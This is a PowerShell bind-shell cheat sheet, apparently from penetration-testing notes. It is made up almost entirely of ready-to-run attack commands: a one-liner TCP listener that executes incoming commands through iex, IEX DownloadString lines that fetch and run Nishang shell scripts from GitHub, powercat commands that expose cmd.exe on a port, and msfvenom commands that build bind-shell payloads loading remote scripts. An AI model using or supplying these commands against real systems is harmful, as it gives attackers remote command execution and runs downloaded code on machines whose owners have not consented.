# PowerShell

## 01 - Regular Shell

```powershell
C:\> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

## 02 - Nishang

### 2.1 - TCP Method

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1')

Invoke-PowerShellTcp -Bind -Port <PORT>
```

### 2.2 - UDP Method

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1')

Invoke-PowerShellUdp -Bind -Port <PORT>
```

## 03 - Generate via `powercat`

Generate bind shell.

```
> powercat -l -p <PORT> -e cmd.exe -g
```

Generate encoded bind shell.

```
> powercat -l -p <PORT> -e cmd.exe -ge
```

## 04 - Generate via `msfvenom`

### 4.1 - x86 (32-bit) Payloads

You can load powershell scripts ahead of time.

```
$ msfvenom -p cmd/windows/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1

$ msfvenom -p windows/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1
```

### 4.2 - x86-64 (64-bit) Payloads

You can load powershell scripts ahead of time.

```
$ msfvenom -p windows/x64/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell-x86-64.ps1
```

---
## References

### Github

- [MrPineMan: Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

- [Powercat](https://github.com/besimorhino/powercat)

### Hacktricks

- [Hacktricks: Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)

### Ironhackers

- [Ironhackers: Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)